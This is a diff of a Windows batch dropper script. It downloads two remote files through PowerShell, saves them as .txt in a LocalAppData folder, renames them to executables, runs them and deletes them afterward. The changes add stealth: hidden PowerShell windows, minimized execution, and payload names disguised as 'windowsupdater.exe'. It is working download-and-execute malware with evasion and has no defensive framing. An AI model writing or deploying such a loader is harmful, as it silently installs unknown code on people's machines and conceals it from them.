@@ -14,19 +14,19 @@ set APPDATA_FOLDER=%LOCALAPPDATA%\%FOLDER%
 mkdir "%APPDATA_FOLDER%" >nul 2>&1
 
 REM Download the .txt files and save them as EXEs in the unique folder
-powershell -Command "Invoke-WebRequest -Uri '%U1%' -OutFile '%APPDATA_FOLDER%\Messageboxtest1.txt' > $null 2>&1"
-powershell -Command "Invoke-WebRequest -Uri '%U2%' -OutFile '%APPDATA_FOLDER%\Messageboxtest2.txt' > $null 2>&1"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%U1%' -OutFile '%APPDATA_FOLDER%\Messageboxtest1.txt' > $null 2>&1"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%U2%' -OutFile '%APPDATA_FOLDER%\Messageboxtest2.txt' > $null 2>&1"
 
 REM Rename the .txt files to .exe
-ren "%APPDATA_FOLDER%\Messageboxtest1.txt" "Messageboxtest1.exe" >nul 2>&1
-ren "%APPDATA_FOLDER%\Messageboxtest2.txt" "Messageboxtest2.exe" >nul 2>&1
+ren "%APPDATA_FOLDER%\Messageboxtest1.txt" "Mexso.exe" >nul 2>&1
+ren "%APPDATA_FOLDER%\Messageboxtest2.txt" "windowsupdater.exe" >nul 2>&1
 
 REM Execute the EXEs from the unique AppData folder
-start "" "%APPDATA_FOLDER%\Messageboxtest1.exe" >nul 2>&1
-start "" "%APPDATA_FOLDER%\Messageboxtest2.exe" >nul 2>&1
+start /min "" "%APPDATA_FOLDER%\Mexso.exe" >nul 2>&1
+start /min "" "%APPDATA_FOLDER%\windowsupdater.exe" >nul 2>&1
 
 REM Optional: Clean up the downloaded EXEs after execution (if desired)
-del "%APPDATA_FOLDER%\Messageboxtest1.exe" >nul 2>&1
-del "%APPDATA_FOLDER%\Messageboxtest2.exe" >nul 2>&1
+del "%APPDATA_FOLDER%\Mexso.exe" >nul 2>&1
+del "%APPDATA_FOLDER%\windowsupdater.exe" >nul 2>&1
 
 exit
